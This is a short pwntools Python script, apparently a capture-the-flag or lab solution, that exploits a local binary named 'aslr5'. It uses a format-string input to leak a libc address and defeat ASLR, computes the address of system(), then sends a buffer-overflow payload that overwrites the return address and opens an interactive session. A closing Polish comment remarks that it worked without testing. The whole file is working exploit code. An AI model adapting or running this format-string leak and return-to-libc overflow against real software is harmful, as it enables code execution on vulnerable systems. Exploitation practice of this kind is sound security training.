#!/bin/python

from pwn import *

context.clear(arch = 'amd64')
context.terminal = ['alacritty', '-e', 'sh', '-c']

e = ELF('/usr/lib/libc.so.6')

return_offset = e.symbols['__libc_start_main'] + 213
system_offset = e.symbols['system']


io = gdb.debug('./aslr5', gdbscript = '''
    b main
    b vuln 
    c
        ''')
#io = process('./aslr5');

io.recvuntil(b"input 1:\n")
io.sendline(b"%9$llx")

return_addr = int(io.recvline().decode('ASCII'), 16)
base_addr = return_addr - return_offset
system_addr = base_addr + system_offset

log.info("Return address: " + hex(return_addr))
log.info("Base address " + hex(base_addr))
log.info("System address " + hex(system_addr))

io.recvuntil(b"input 2:\n")
io.sendline(
        b'A' * 16 +
        b'B' * 8 +
        p64(system_addr)
    )

io.interactive()

# ten skrypt zadziałał bez testowania lol
